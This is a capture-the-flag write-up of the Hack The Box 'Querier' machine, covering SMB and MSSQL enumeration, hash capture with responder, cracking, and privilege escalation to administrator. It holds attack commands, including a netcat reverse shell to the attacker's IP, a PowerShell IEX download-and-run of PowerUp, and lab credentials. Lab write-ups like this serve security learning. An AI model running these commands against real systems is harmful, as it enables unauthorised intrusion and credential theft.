---
title: "HTB Querier Writeup"
date: 2023-07-02
tags: ["CTF","Security"]
description: "My first time exploiting MSSQL."
draft: false
type: page
---


# HTB Querier Writeup

## Enumeration

First I did my initial nmap scans and scans with scripts and service detection.

```bash
[~/htb/bastion]$ nmap -p- 10.10.10.125
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-01 15:30 EDT
Nmap scan report for 10.10.10.125
Host is up (0.028s latency).
Not shown: 65521 closed tcp ports (conn-refused)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1433/tcp  open  ms-sql-s
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
```

```bash
[~/htb/bastion]$ nmap -sV -sC -p 135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669,49670,49
671 -oA bastion 10.10.10.125
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-01 15:33 EDT
Nmap scan report for 10.10.10.125
Host is up (0.032s latency).

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-info:
|   10.10.10.125:1433:
|     Version:
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info:
|   10.10.10.125:1433:
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: QUERIER
|     DNS_Domain_Name: HTB.LOCAL
|     DNS_Computer_Name: QUERIER.HTB.LOCAL
|     DNS_Tree_Name: HTB.LOCAL
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-07-01T19:28:01
|_Not valid after:  2053-07-01T19:28:01
|_ssl-date: 2023-07-01T19:34:36+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2023-07-01T19:34:31
|_  start_date: N/A
```


Doing a listing of the SMB shares we find something readable called Reports. 

```bash
~/htb/bastion]$ smbclient -L \\\\10.10.10.125\\
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Reports         Disk
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.125 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

I went in and downloaded the file in the share, which was an excel sheet with macros. I also looked at the exif data which looks like it might have a username. This turned out to be nothing.

```bash
[~/htb/bastion]$ exiftool Currency\ Volume\ Report.xlsm
ExifTool Version Number         : 12.63
File Name                       : Currency Volume Report.xlsm
Directory                       : .
File Size                       : 12 kB
File Modification Date/Time     : 2023:07:01 15:58:29-04:00
File Access Date/Time           : 2023:07:01 15:58:52-04:00
File Inode Change Date/Time     : 2023:07:01 15:58:29-04:00
File Permissions                : -rw-r--r--
File Type                       : XLSM
File Type Extension             : xlsm
MIME Type                       : application/vnd.ms-excel.sheet.macroEnabled.12
Zip Required Version            : 20
Zip Bit Flag                    : 0x0006
Zip Compression                 : Deflated
Zip Modify Date                 : 1980:01:01 00:00:00
Zip CRC                         : 0x513599ac
Zip Compressed Size             : 367
Zip Uncompressed Size           : 1087
Zip File Name                   : [Content_Types].xml
Creator                         : Luis
Last Modified By                : Luis
Create Date                     : 2019:01:21 20:38:56Z
Modify Date                     : 2019:01:27 22:21:34Z
Application                     : Microsoft Excel
Doc Security                    : None
Scale Crop                      : No
Heading Pairs                   : Worksheets, 1
Titles Of Parts                 : Currency Volume
Company                         :
Links Up To Date                : No
Shared Doc                      : No
Hyperlinks Changed              : No
App Version                     : 16.0300

```

After poking around for a bit I opened up the macros in the sheet, and find what appears to be a user and pass that is valid for connecting to the open MSSQL port.

```bash
conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"
``` 


## Foothold

We can use mssqlclient.py to connect in.

```bash
mssqlclient.py 'reporting:PcwTWTHRwryjc$c6'@10.10.10.125 -db volume -windows-auth
``` 

From there I did some enumeration like looking at the tables and databases but didn't get much.

```bash
SQL> SELECT name FROM master.dbo.sysdatabases;
name                                                                                                    
--------------------------------------------------------------------------------------------------------------------------------
master                                                                                                  
tempdb                                                                                                  
model                                                                                                   
msdb                                                                                                    
volume 
```

Consulting [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server) and 0xdf's [walkthrough](https://0xdf.gitlab.io/2019/06/22/htb-querier.html) I learned about capturing hashes with responder from MSSQL.

```bash
sudo responder -I tun0
xp_dirtree '\\10.10.14.26\share\thing
```

Now we have the hash of mssql-svc and can try to crack it.

```bash
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt -O --force
```

Now we have a password of a higher level user within MSSQL and can log back in and get command execution.

```
mssqlclient.py mssql:'corporate568 '@10.10.10.125 -windows-auth
```

We can leverage the xp_cmdshell function in the SQL prompt to execute commands but it needs to be enabled first.

```cmd
sp_configure 'show advanced options', '1'
RECONFIGURE

sp_configure 'xp_cmdshell', '1'
RECONFIGURE
```

After this, AV was not taking very kindly to my reverse shell attempts so I had to learn a different way. We can host netcat off of an smb share and execute it from there.

```cmd
smbserver.py -smb2support a .
xp_cmdshell \\10.10.14.26\a\nc.exe -e cmd.exe 10.10.14.26 5555
```


## PrivEsc

From here it is fairly simple to run PowerUp and gain the root password.

```cmd
START /B "" powershell -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.14.26/PowerUp.ps1')
```

Results:

```cmd
Privilege   : SeImpersonatePrivilege
Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
TokenHandle : 2460
ProcessId   : 2112
Name        : 2112
Check       : Process Token Privileges

ServiceName   : UsoSvc
Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
CanRestart    : True
Name          : UsoSvc
Check         : Modifiable Services

ModifiablePath    : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
IdentityReference : QUERIER\mssql-svc
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'

UnattendPath : C:\Windows\Panther\Unattend.xml
Name         : C:\Windows\Panther\Unattend.xml
Check        : Unattended Install Files

Changed   : {2019-01-28 23:12:48}
UserNames : {Administrator}
NewName   : [BLANK]
Passwords : {MyUnclesAreMarioAndLuigi!!1!}
File      : C:\ProgramData\Microsoft\Group
            Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
```

Aside from the administrator password just being, there... in the PowerUp from a GPP file there are also some other avenues to explore like token impersonation or Potato attacks because of SeImpersonate. I tried the reported service abuse but never got it working. The DLL hijacking will not work unless we can start and stop the service.

wmiexec.py was what worked to ultimately give us an administrator shell.

```bash
wmiexec.py Administrator:'MyUnclesAreMarioAndLuigi!!1!'@10.10.10.125
```
